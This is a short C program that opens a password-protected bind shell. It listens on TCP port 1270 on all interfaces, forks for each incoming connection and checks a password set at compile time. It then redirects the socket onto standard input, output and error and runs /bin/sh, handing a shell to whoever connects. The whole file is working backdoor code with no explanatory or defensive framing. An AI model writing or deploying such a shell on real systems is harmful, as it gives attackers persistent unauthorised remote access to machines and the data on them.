#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

// the password to login to the shell
static const char o_password[] = orig_password;

bool check_password(const char* e_password)
{
    // validate the password
    return memcmp(o_password, e_password, sizeof(o_password) - 1) != 0;
}


int main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr, "Failed to create the socket.");
        return EXIT_FAILURE;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind_addr.sin_port = htons(1270);

    int bind_result = bind(sock, (struct sockaddr*) &bind_addr,
        sizeof(bind_addr));
    if (bind_result != 0)
    {
        perror("Bind call failed");
        return EXIT_FAILURE;
    }

    int listen_result = listen(sock, 5);
    if (listen_result != 0)
    {
        perror("Listen call failed");
        return EXIT_FAILURE;
    }
    
    while (true)
    {
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0)
        {
            perror("Accept call failed");
            return EXIT_FAILURE;
        }

        int child_pid = fork();
        if (child_pid == 0)
        {
            // read in the password
            char password_input[sizeof(o_password)] = { 0 };
            int read_result = read(client_sock, password_input,
                sizeof(password_input));
            if (read_result < (int)(sizeof(o_password) - 1))
            {
                printf("Less than 32 bits");
                close(client_sock);
                return EXIT_FAILURE;
            }

            if (check_password(password_input))
            {
                printf("Failed");
                close(client_sock);
                return EXIT_FAILURE;
            }
            else
            {
                printf("Password Correct");
            }
            

            dup2(client_sock, 0);
            dup2(client_sock, 1);
            dup2(client_sock, 2);
            
        
            char* empty[] = { NULL };
            execve("/bin/sh", empty, empty);
            close(client_sock);
            return EXIT_SUCCESS;
        }

        close(client_sock);
    }
}

// sudo lsof -n -i :1270 |grep LISTEN
